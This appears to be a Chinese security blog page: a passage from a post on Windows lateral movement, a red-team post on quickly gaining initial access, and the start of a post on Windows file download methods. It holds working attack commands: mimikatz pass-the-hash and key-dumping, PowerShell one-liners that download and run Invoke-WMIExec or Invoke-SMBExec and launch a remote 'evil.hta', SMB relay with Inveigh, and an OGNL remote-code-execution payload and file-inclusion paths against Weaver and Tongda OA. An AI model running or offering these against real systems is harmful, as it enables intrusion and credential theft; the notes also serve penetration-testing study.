<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825163854134.png" alt="image-20200825163854134"></p>
<p><strong>使用DCOM进行横向移动</strong></p>
<p>1、使用impacket进行横向移动</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.exe .&#x2F;administrator:Admin123456@192.168.3.144 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825165327715.png" alt="image-20200825165327715"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.exe -hashes :ae4c0d5fb959fda8f4cb1d14a8376af4 .&#x2F;administrator@192.168.3.144 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825165658575.png" alt="image-20200825165658575"></p>
<h3 id="RDP-hijacking"><a href="#RDP-hijacking" class="headerlink" title="RDP hijacking"></a>RDP hijacking</h3><p><strong>什么是RDP hijacking?</strong></p>
<p>​        RDP劫持可以在我们没有用户密码的情况下获取用户的情况下获取用户的桌面。</p>
<p><strong>有什么利用条件？</strong></p>
<ul>
<li>获取了当前系统的system权限</li>
<li>通过query user 可以看到多个用户</li>
</ul>
<p><strong>如何使用RDP劫持？</strong></p>
<p>​        通过在任务管理器中，我们可以看到当前有两个用户处于活动状态</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825173119488.png" alt="image-20200825173119488"></p>
<p>​        如果我们想切换到其他用户的会话，右击选择连接，输入密码后即可获取其他用户的rdp桌面</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825173332767.png" alt="image-20200825173332767"></p>
<p>​        但是当我们具有system权限时，可以无需密码获取其他用户的会话。</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825181732190.png" alt="image-20200825181732190"></p>
<p>​        当然使用这种方式会把其他正在运行的用户挤下线，对于处于断开状态的用户则没有什么影响。</p>
<h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p><strong>什么是PTH?</strong></p>
<p>​        由于 net-ntlm 在验证的时候,是直接用用户密码 hash 而非明文的方式来验证的,因此仅仅知道hash也可以完成认证过程，拿到用户的hash直接去认证并且获取访问资源的这个过程就叫做PTH。</p>
<p><strong>为什么要使用PTH?</strong></p>
<p>​        在渗透的过程中，经常会遇到2012及以上的系统，这些系统在默认情况下lsass进程中没有保存明文，只能获取到hash，在解不开密码的情况下，只能通过pth来进行横向渗透。</p>
<p><strong>PTH的利用条件？</strong></p>
<ul>
<li>445端口可以正常访问</li>
<li>获取目标主机的ntml hash</li>
</ul>
<p><strong>利用PTH横向渗透</strong></p>
<p>1、通过mimikatz进行PTH利用</p>
<p>​        在cs中使用mimikatz来进行PTH</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:. &#x2F;ntlm:xxxxx &#x2F;run:&quot;powershell -w hidden&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826103350172.png" alt="image-20200826103350172"></p>
<p>​        本来没有权限访问192.168.3.144主机的目录，但是通过令牌替换后，即可访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steal_token PID</span><br><span class="line">shell dir \\192.168.3.144\c$</span><br><span class="line">rev2self  恢复原始用户权限</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826103511241.png" alt="image-20200826103511241"></p>
<p>2、使用CS进行PTH横向移动</p>
<p>​            在CS的选项中选择target</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826105348809.png" alt="image-20200826105348809"></p>
<p>​                对着target右键选择psexec</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826105433978.png" alt="image-20200826105433978"></p>
<p>​            输入用户账户和hash，点击lauch后即可上线</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826105236740.png" alt="image-20200826105236740"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826105635042.png" alt="image-20200826105635042"></p>
<p>3、使用powershell进行PTH进行横向移动</p>
<p>​        首先使用cs生成hta文件，并且将这个hta挂载到web上</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826105959580.png" alt="image-20200826105959580"></p>
<p>​        执行如下命令通过PTH加载evil.hta上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> shell powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;xxxxxx&#x2F;Invoke-WMIExec.ps1&#39;);Invoke-WMIExec -Target 192.168.3.144</span><br><span class="line">-Domain . -Username Administrator -Hash xxxxx -Command \&quot;mshta http:&#x2F;&#x2F;xxx&#x2F;evil.hta\&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826110606262.png" alt="image-20200826110606262"></p>
<p>​        也可以使用smbexec来进行hash传递上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;xxxxx&#x2F;invoke-SMBExec.ps1&#39;);Invoke-SMBExec -Target 192.168.3.144</span><br><span class="line">-Domain . -Username Administrator -Hash xxxx -Command \&quot;mshta http:&#x2F;&#x2F;xxxx&#x2F;evil.hta\&quot; -verbose&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826112135162.png" alt="image-20200826112135162"></p>
<p>4、使用imapcket套件进行PTH</p>
<p>​        使用wmiexec进行pth</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -hashes &quot;xxx:xxx&quot; .&#x2F;Administrator@192.168.3.144 &quot;query user&quot;</span><br></pre></td></tr></table></figure>

<p>​        在cs下执行会有异常，具体原因不详。</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826113907462.png" alt="image-20200826113907462"></p>
<p>​        在cmd下执行正常，如果有问题需要改一下cmd的编码chcp 936</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826113949941.png" alt="image-20200826113949941"></p>
<p>​        使用smbexec进行横向渗透,这种方式只能获取半交互的shell,不能在cs下或者webshell下进行利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe -hashes xx:xxx .&#x2F;Administrator@192.168.3.144</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826114404627.png" alt="image-20200826114404627"></p>
<p>​        在windows server 2012R2以上默认无法使用RID非500的用户进行PTH利用。</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826140439030.png" alt="image-20200826140439030"></p>
<p>​        当我们设置LocalAccountTokenFilterPolicy（默认不存在）这项为1时，则其他用户也可PTH</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826142001554.png" alt="image-20200826142001554"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826142030450.png" alt="image-20200826142030450"></p>
<p><strong>pass the key</strong></p>
<p>​        当目标处于域环境并且安装了KB2871997补丁，可以使用这种方法进行横向移动。首先导出aes key </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::ekeys</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826143252802.png" alt="image-20200826143252802"></p>
<p>​        使用mimikatz进行PTK</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:xxx.ORG &#x2F;aes256:xxxx</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826144548650.png" alt="image-20200826144548650"></p>
<p>​        在dir的时候注意要使用主机名而不是ip。</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826144657435.png" alt="image-20200826144657435"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826144600749.png" alt="image-20200826144600749"></p>
<h3 id="SMB-RELAY"><a href="#SMB-RELAY" class="headerlink" title="SMB RELAY"></a>SMB RELAY</h3><p><strong>什么是SMB?</strong></p>
<p>​        服务器消息块（SMB）协议是一种网络文件共享协议，在Microsoft Windows中实现称为Microsoft SMB协议。SMB允许您共享文件，磁盘，目录，打印机等。SMB运行在445端口并且提供了多种功能，例如操作文件，共享，消息传递，IPC等。</p>
<p><strong>什么是net-hash?</strong></p>
<p>​        net-hash是windows hash在网络中传递的一种形式形式，net-hash是由ntml hash计算得来的。</p>
<p><strong>什么是smb relay?</strong></p>
<p>​        要理解smb relay(中继)，关于windows认证过程的了解是绕不过去了，所以有必要先了解windows NTML是怎么认证的。</p>
<p>第一步：Client 将用户名和本机的一些信息发送给 Server</p>
<p>第二步：Server 产生一个16位的 Challenge 发送给 Client，同时本地存储 Challenge</p>
<p>第三步：Client 接收到 Server 的 Challenge 后使用输入的明文密码产生的 NTLM Hash加密 Challenge 产生 Response（也称为Net-NTLM Hash），并将 Response 发送给 Server</p>
<p>第四步：服务端接收到 Response ，使用 SAM 中所存储的对应用户的 NTLM Hash 来加密步骤2所存储的 Challenge ，并将结果与 Response 进行比较。若一致则通过认证。</p>
<p>​        通过上面的过程我们可以看到，在第三步客户端是使用服务端生成的Challenge和本地的NTLM Hash一起加密产生了net-hash，并将net-hash传递给服务端。如果在NTLM 认证的过程中，有一个第三者作为一个中介，client会以为它是server端并且将net-hash发送给这个第三者，那么这个第三者就可以拿到client的net-hash，替代client与server端进行认证，这个过程无论对于client还是server都是正常的完成ntml认证。但是对于第三者而言，它可以代替client去访问server端的资源。这个过程就叫做smb relay。</p>
<p><strong>怎么发起smb relay？</strong></p>
<p>​        一般情况下，我们要攻击的主机即使进行ntml认证，流量并不会经过第三者的主机。那么如何让目标主机和我们主机进行ntml认证呢。</p>
<p>1、LLMNR/NBNS欺骗</p>
<p>​            LLMNR和NBNS是Windows系统完成名称解析的一种方法。windows的名称解析规则如下：</p>
<ul>
<li>首先在本地host文件中进行查询(%windir%\System32\drivers\etc\hosts)</li>
<li>其次在DNS缓存/DNS服务器中进行查询</li>
<li>当上面两种方式未查询到后，则使用LLMNR或者NBNS协议进行解析。</li>
</ul>
<p>LLMNR工作过程：主机会通过 UDP 向局域网内发送多播查询，查询主机名对应的IP，查询范围被限制在本地子网内。本地子网内每台支持LLMNR的主机在收到这个查询请求后，收到该请求的主机会判断自己的主机名是不是这个查询的主机名。如果是，这台主机会回复自己IP地址给请求该查询的主机；如果不是<strong>，</strong>则丢弃该请求。</p>
<p>​        因为LLMNR并没有认证相应的主机是否是需要寻找的主机，因此攻击者可以伪装成受害者要访问的目标机器，并从而让受害者交出相应的登陆凭证。</p>
<p><strong>windows下使用Inveigh针对SMB RELAY利用</strong></p>
<p>​        首先windows不通版本使用的smb版本是不一样的，具体如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Smb v1 主要用于 xp&#x2F;2003 以下的系统中</span><br><span class="line">Smb v2.x 主要用于 win vista&#x2F;7&#x2F;2008&#x2F;2008r2</span><br><span class="line">Smb v3.x 主要用于 win 8 &#x2F; 8.1 &#x2F; 2012 &#x2F; 2012r2 &#x2F;2016</span><br></pre></td></tr></table></figure>

<p>​        当目标开启了启 smb 签名后则无法利用，一般windows server会开启而windows单机不开启，打了ms08-068[KB957097]的主机也无法利用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module C:\Users\dbadmin\Desktop\Inveigh.ps1</span><br><span class="line">Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y –LLMNR Y -HTTP Y -PROXY Y</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826161637020.png" alt="image-20200826161637020"></p>
<p>​        当我们在windows单机上对不存在的主机发起smb请求，即可获取net-hash</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826163902324.png" alt="image-20200826163902324"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826163718354.png" alt="image-20200826163718354"></p>
<p>​        抓到net-hash后，可以尝试使用hashcat跑一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 0 -m 5600 hash.txt top10w.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826165658506.png" alt="image-20200826165658506"></p>
<p><strong>参考文章</strong></p>
<p><a href="https://www.freebuf.com/articles/network/246440.html" target="_blank" rel="noopener">内网横向移动：利用WMI来渗透</a></p>
<p><a href="https://lengjibo.github.io/LateralMovement/" target="_blank" rel="noopener">LateralMovement(横向移动)</a></p>
<p><a href="[https://pingmaoer.github.io/2020/06/30/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%BA%8C/](https://pingmaoer.github.io/2020/06/30/域内横向移动二/)">域内横向移动二</a></p>
<p><a href="[https://0x0c.cc/2019/09/25/%E5%86%85%E7%BD%91%E6%A8%AA%E7%A7%BB%E4%B9%8BWinRM/](https://0x0c.cc/2019/09/25/内网横移之WinRM/)">内网横移之WinRM</a></p>
<p><a href="https://pentestlab.blog/2018/05/15/lateral-movement-winrm/" target="_blank" rel="noopener">横向运动– WinRM</a></p>
<p><a href="http://t3ngyu.leanote.com/post/345687ddad59" target="_blank" rel="noopener">SCShell：横向移动工具</a></p>
<p><a href="http://t3ngyu.leanote.com/post/LM-SMB" target="_blank" rel="noopener">横向渗透之 [SMB]</a></p>
<p><a href="[https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8DCOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/](https://3gstudent.github.io/3gstudent.github.io/域渗透-利用DCOM在远程系统执行程序/)">域渗透——利用DCOM在远程系统执行程序</a></p>
<p><a href="https://www.jianshu.com/p/c7d8e7d9c03c" target="_blank" rel="noopener">横向移动之smb中继攻击</a></p>
<p><a href="[https://www.7ten7.top/2019/12/12/2019-12-12-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E4%B9%8BNTLM/](https://www.7ten7.top/2019/12/12/2019-12-12-Windows认证机制之NTLM/)">Windows认证机制之NTLM</a></p>
<p><a href="https://blog.csdn.net/whatday/article/details/107698144" target="_blank" rel="noopener">内网渗透研究：LLMNR和NetBIOS欺骗攻击分析</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/21/%E5%85%B3%E4%BA%8Ehw%E6%89%93%E7%82%B9%E7%9A%84%E6%80%9D%E8%80%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/21/%E5%85%B3%E4%BA%8Ehw%E6%89%93%E7%82%B9%E7%9A%84%E6%80%9D%E8%80%83/" class="post-title-link" itemprop="url">关于hw打点的思考</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-08-21 09:26:01 / Modified: 17:47:41" itemprop="dateCreated datePublished" datetime="2020-08-21T09:26:01+08:00">2020-08-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​            一年一度的hw活动又开始了，关于hw的比拼，各个公司都十分看重，都希望能在这次比赛中拿到一个比较好的成绩，针对于hw这种形式，还是比较考验一个人或者一个团队的梭哈能力，有些红队人员虽然内网非常强，姿势也非常骚，可是打点可能不是很快，对于这种比赛来讲，就是手慢则无。反而一把梭哈，速度快还能拿到比较不错的成绩。下面我根据我的不成熟的经验来分析一下，如何提升速度。</p>
<p>​            首先是信息搜集的能力，我们可以想一下，如果一个攻击队，信息搜集非常慢，半天才找到不多的资产，然后再去做一些常规的rce的测试，和那些有自动化工具的队伍比起来就慢了一大截，因此hw还是比较考验队伍快速搜集资产的能力，否则即使0day在手，找不到对应的平台也没用啊。关于自动化信息搜集的工具，其实可以借助一些网络资产搜集引擎，因为hw的很多蓝方精神都是高度集中，你扫个端口肯定就被拌掉了，因此最好在搜集的时候能不直接和这些目标接触并且能拿到我们想要的信息。这里我提供一个思路，就是调用各种接口搜集资产信息，找到以后再去验证存活，再获取一些指纹信息，比如网站的架构，什么cms，用了什么中间件，这些信息对我们打点来说都是非常重要的。</p>
<p>​            然后再来谈谈挖洞，其实hw这些目标都挺大的，也就是说资产比较多，有新架构有老架构，用这种框架中间件的也非常多。那当我们拿到这么多资产后，我们该如何快速打点呢？</p>
<p>​            我认为首先应该去找各种影响比较大的rce去检测</p>
<p><strong>java站</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">weblogic rce  根据404报错的那个标题即可识别是否是weblogic</span><br><span class="line">struts rce		有人写了识别工具，也可以根据后缀比如.do，.action</span><br><span class="line">spring boot rce 根据404或者500的报错页面进行识别，找env文件</span><br><span class="line">shior rce       找java的登录口，看返回结果是否有remeberme 之类的字段</span><br></pre></td></tr></table></figure>

<p><strong>php站</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thinkphp rce thinkphp可以根据路由来进行识别</span><br><span class="line">解析漏洞   1.jgp&#x2F;1.php</span><br></pre></td></tr></table></figure>

<p><strong>asp/aspx</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ueditor任意文件上传  扫ueditor的目录</span><br></pre></td></tr></table></figure>

<p>​        当没有这些影响比较大的漏洞时，我们再去考虑一些cms或者一些oa这种我们知道某些版本有漏洞的站，最好还是那种已知有rce的cms。这个其实也比较依赖于大家的经验和总结能力，毕竟要跟一些爆发的漏洞也挺费精力的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">通达：</span><br><span class="line">漏洞指纹：&#x2F;ispirit&#x2F;interface&#x2F;gateway.php 文件包含漏洞</span><br><span class="line">ispirit&#x2F;interface&#x2F;gateway.php?json&#x3D;&#123;&quot;url&quot;:&quot;&#x2F;general&#x2F;..&#x2F;..&#x2F;mysql5&#x2F;my.ini&quot;&#125;</span><br><span class="line">ispirit&#x2F;interface&#x2F;gateway.php?json&#x3D;&#123;&#125;&amp;url&#x3D;&#x2F;general&#x2F;..&#x2F;..&#x2F;nginx&#x2F;logs&#x2F;oa.access.log</span><br><span class="line">泛微：</span><br><span class="line">e-mobile常在89端口 rce</span><br><span class="line">访问login.do post如下内容：</span><br><span class="line">message&#x3D;(#_memberAccess&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&amp;cmd&#x3D;whoami</span><br><span class="line">泛微rce &#x2F;weaver&#x2F;bsh.servlet.BshServlet 直接访问即可执行命令</span><br></pre></td></tr></table></figure>

<p>​        当这些可以直接可以利用的rce无法利用时，我们就要去找一些cms可以通过组合可以getshell的站。这些如果还没有，那我们就需要去看那些他们自己开发的网站了。去找找后台，找找上传，找找注入等等。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">windows文件下载方式总结</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-08-12 17:21:36" itemprop="dateCreated datePublished" datetime="2020-08-12T17:21:36+08:00">2020-08-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-08-21 17:48:02" itemprop="dateModified" datetime="2020-08-21T17:48:02+08:00">2020-08-21</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">好好学习，天天向上</span><br></pre></td></tr></table></figure>

<p>​        我认为按照我们平时对于远程加载文件的需求，可以按照能否加载任意格式的文件来进行区分，有些下载方式，可以去远程下载任意格式的文件，比如exe,txt等等，但是有些则是有限制的，只能下载指定格式的文件，比如js，xls，msi等等。还有些方式也可以下载或者加载远程的文件，但是不是windows自带的方式，所以也可以把这种方式当作一种类型进行总结。最后还有一些方式不能通过http协议进行下载，但是可以通过smb协议进行下载文件，这也可以列为一种方式。</p>
